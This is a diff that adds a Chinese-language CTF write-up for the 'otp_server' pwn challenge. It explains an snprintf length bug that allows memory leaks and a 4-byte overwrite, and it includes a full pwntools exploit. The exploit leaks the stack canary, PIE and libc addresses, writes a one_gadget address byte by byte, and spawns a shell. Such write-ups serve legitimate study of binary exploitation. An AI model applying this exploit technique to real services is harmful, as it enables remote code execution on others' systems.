@@ -288,6 +288,126 @@ emm , that all chanllenges I solved in the game ,thank facebook for this game !
 and It's important have a fast vps.....several times I slove the challenge but can't get the flag. 
 
 
+# Addition
+以下部分是一些复现题目,最进期末可能时间不多不能如数复现。
+
+# opt_server
+这题是值得反思的。。。
+比赛的时候死活做不出来我居然睿智地认为自己已经做出来了只是网速问题。。。
+其实我根本没有get到point。
+
+## vulnerability
+```python
+unsigned __int64 __fastcall do_enc_and_leak(char *res)
+{
+unsigned __int64 v1; // ST28_8
+int RND; // eax
+int rnd; // ST1C_4
+int len; // eax
+__int64 len_1; // ST20_8
+
+v1 = __readfsqword(0x28u);
+RND = fread_4();
+rnd = RND;
+*(_DWORD *)res = RND;
+len = snprintf(res + 4, 0x104uLL, "%s", &msg);// ret value is the len to msg
+len_1 = len;
+*(_DWORD *)&res[len + 4] = rnd;               // someproble
+do_xor(res);
+do_leak(res, len_1 + 8);
+return __readfsqword(0x28u) ^ v1;
+```
+这里的`snprintf`比较危险，返回值是`msg`的长度。所以我们可以利用填满`msg`来连接上后面的`key`导致`len`随意控制。
+从而产生地址泄漏和任意4字节写`rnd`的问题。
+
+## 利用
+'睿智'的我没想到可以多次写。。。做了那么多pwn题还是那么死板实在丢人。
+* leak mem
+* 从高地址向低地址多次写，每次写上对的值再写下一个字节。
+
+```python
+def fill(offset,data):
+key("\xff"*(0x10+offset)+'\x00')
+i=0
+while(1):
+i+=1
+#print i
+enc("A"*0x100)
+p.readuntil("--\n")
+tmp=p.read(4)
+res=""
+for x in tmp:
+res+=chr(ord(x)^0xff)
+res=u32(res)
+res=res>>24
+if ((res&0xff)==data):
+return    
+```
+## exp
+```python
+from pwn import *
+def cmd(n):
+p.sendlineafter(">>> ",str(n))
+def key(key):
+cmd(1)
+p.sendafter(":\n",str(key))
+def enc(e):
+cmd(2)
+p.sendafter(":\n",str(e))
+def fill(offset,data):
+key("\xff"*(0x10+offset)+'\x00')
+i=0
+while(1):
+i+=1
+#print i
+enc("A"*0x100)
+p.readuntil("--\n")
+tmp=p.read(4)
+res=""
+for x in tmp:
+res+=chr(ord(x)^0xff)
+res=u32(res)
+res=res>>24
+if ((res&0xff)==data):
+return    
+
+libc=ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
+p=process('./otp_server')
+#p=remote("challenges3.fbctf.com",1338)
+key("\xff"*0xe0)
+enc("A"*0x100)
+p.readuntil("--\n")
+p.read(0x108)
+canary=u64(p.read(8))
+pie=u64(p.read(8))-0xdd0
+base=u64(p.read(8))-(0x7ffff7a05b97-0x7ffff79e4000)
+p.read(8)
+stack=u64(p.read(8))
+#log.warning(hex(canary))
+
+log.warning(hex(base))
+libc.address=base
+one=0x10a38c+base
+one=0xffffff&one
+log.success(hex(one))
+
+fill(3,((one>>16)&0xff))
+fill(2,((one>>8)&0xff))
+fill(1,(one&0xff))
+
+
+gdb.attach(p,'''
+b *0x555555554dcc
+''')
+
+context.log_level='debug'
+cmd(3)
+
+p.interactive()
+```
+
+
+
 [1]: http://cenalulu.github.io/linux/about-denormalized-float-number/
 [2]: https://www.h-schmidt.net/FloatConverter/IEEE754.html
 [3]: https://github.com/R3t-team/R3t-team
